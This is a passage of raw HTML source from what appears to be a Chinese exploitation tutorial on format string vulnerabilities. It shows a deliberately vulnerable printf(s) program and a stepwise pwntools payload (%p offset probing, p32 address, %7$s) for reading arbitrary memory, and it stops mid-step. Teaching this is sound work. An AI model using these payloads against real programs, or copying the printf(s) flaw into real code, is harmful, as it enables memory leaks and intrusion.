&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;counter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;va_list&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;va_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argcount&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;counter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;counter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argcount&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;counter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;va_arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;va_end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;格式化字符串漏洞&#34;&gt;格式化字符串漏洞
&lt;/h2&gt;&lt;h3 id=&#34;核心原理&#34;&gt;核心原理
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;格式化输出的栈上分布
&lt;ul&gt;
&lt;li&gt;示例
&lt;ul&gt;
&lt;li&gt;代码&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Color %s, Number %d, Float %4.2f&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;red&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;123456&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3.14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;栈示意图&lt;/li&gt;
&lt;/ul&gt;
 &lt;p align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://example.com/images/31.png&#34; alt=&#34;printf&#34; width=&#34;100%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;泄露内存&#34;&gt;泄露内存
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;核心思想: printf是依次打印栈上的数据，即可以通过printf(&amp;quot;%x&amp;quot;)直接打印栈上内容&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;泄露栈内存&#34;&gt;泄露栈内存
&lt;/h4&gt;&lt;p&gt;以以下程序为例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x22222222&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;scanf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%08x.%08x.%08x.%s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;编译运行后有&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%08x.%08x.%08x
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000001.22222222.ffffffff.%08x.%08x.%08x
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ffcfc400.000000c2.f765a6bb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;打印出了栈上后续三个字的值&lt;/p&gt;
&lt;h4 id=&#34;泄露任意地址内存&#34;&gt;泄露任意地址内存
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心思想：利用%s访问的是栈上地址，将想要访问的地址写入栈上特定位置，然后使用%s访问输出&lt;/li&gt;
&lt;li&gt;详细操作步骤
&lt;ul&gt;
&lt;li&gt;Step1:确定偏移量（参数位置）&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;输出示例
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AAAA.0xffffd09c.0x100.0x80491fe.0xffffd144.0xf7fbe780.0xf7d93374.0x41414141
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;观察到AAAA的十六进制值0x41414141出现在第7个位置。这个偏移量用于后面指定printf访问的参数位置
&lt;ul&gt;
&lt;li&gt;Step2:构造地址载荷&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;target_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x804c02c&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 要泄露的地址&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 打包为小端序&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Step3:指定读取位置&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%7$s&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#使用步骤1确定的偏移量&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Step4:选择读取方式&lt;/li&gt;
&lt;li&gt;Step5:发送并解析数据&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 发送完整payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%7$s&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 接收输出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;done&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 根据程序输出调整&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 解析泄露数据&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;leak_start&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 跳过地址本身&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;leaked_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;leak_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 去除尾部&amp;#34;id is...done&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Step6:清理输出&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 接收并清理输出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Address of id is 0x&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 跳过提示&lt;/span&gt;
